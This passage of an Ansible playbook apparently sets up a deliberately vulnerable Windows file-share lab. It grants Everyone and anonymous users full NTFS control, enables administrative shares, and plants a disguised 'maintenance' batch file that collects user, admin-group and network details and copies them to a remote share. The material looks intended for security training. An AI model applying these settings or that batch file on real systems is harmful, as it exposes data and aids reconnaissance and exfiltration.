  tags: [vulnerability, data]

# =============================================================================
# V-FS-006: Set Weak NTFS Permissions
# =============================================================================
- name: "VULN V-FS-006: Set weak NTFS permissions (Everyone Full Control)"
  ansible.windows.win_powershell:
    script: |
      $sharePath = "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}"

      # Reset permissions
      $acl = Get-Acl $sharePath

      # Remove inheritance
      $acl.SetAccessRuleProtection($true, $false)

      # Add Everyone - Full Control (VULNERABLE)
      $everyone = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
      $acl.AddAccessRule($everyone)

      Set-Acl $sharePath $acl
      Write-Output "Set vulnerable NTFS permissions on $sharePath"
  tags: [vulnerability, permissions]

# =============================================================================
# V-FS-008: Create World-Writable Upload Directory
# =============================================================================
- name: Create uploads directory
  ansible.windows.win_file:
    path: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\Public\\Uploads"
    state: directory
  tags: [vulnerability, shares]

- name: "VULN V-FS-008: Set uploads directory as world-writable"
  ansible.windows.win_powershell:
    script: |
      $uploadsPath = "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\Public\Uploads"

      $acl = Get-Acl $uploadsPath
      $acl.SetAccessRuleProtection($true, $false)

      # Everyone Full Control
      $everyone = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
      $acl.AddAccessRule($everyone)

      # Anonymous Full Control
      $anon = New-Object System.Security.AccessControl.FileSystemAccessRule("ANONYMOUS LOGON", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
      $acl.AddAccessRule($anon)

      Set-Acl $uploadsPath $acl
      Write-Output "Created world-writable uploads directory"
  tags: [vulnerability, permissions]

# =============================================================================
# V-FS-004: Enable Open Administrative Shares
# =============================================================================
- name: "VULN V-FS-004: Ensure administrative shares are accessible"
  ansible.windows.win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
    name: AutoShareWks
    data: 1
    type: dword
  tags: [vulnerability, shares]

- name: "VULN V-FS-004: Ensure admin share permissions are weak"
  ansible.windows.win_regedit:
    path: HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
    name: AutoShareServer
    data: 1
    type: dword
  tags: [vulnerability, shares]

# =============================================================================
# Create Suspicious Executable in Share
# =============================================================================
- name: "VULN: Create suspicious batch file"
  ansible.windows.win_copy:
    content: |
      @echo off
      REM System maintenance script - DO NOT DELETE
      REM Runs nightly to collect system information

      net user > C:\Windows\Temp\users.txt
      net localgroup administrators >> C:\Windows\Temp\users.txt
      ipconfig /all > C:\Windows\Temp\network.txt
      netstat -an >> C:\Windows\Temp\network.txt

      REM Upload to central server
      copy C:\Windows\Temp\*.txt \\10.0.0.100\data\ 2>nul

    dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\IT\\Scripts\\system_maintenance.bat"
  tags: [vulnerability, persistence]

# =============================================================================
# Create Sample Legitimate Files
# =============================================================================
- name: Create sample readme in Public folder
  ansible.windows.win_copy:
    content: |
      ================================================================================
      Blue Team Industries - Public File Share
      ================================================================================

      Welcome to the corporate file share!
      Please follow company policy when storing files here.

      Questions? Contact IT at helpdesk@blue.lab
      ================================================================================
    dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\Public\\README.txt"
  tags: [samples]

- name: Display completion message
  ansible.builtin.debug:
    msg: "VULNERABLE File Services configuration completed on {{ inventory_hostname }}"
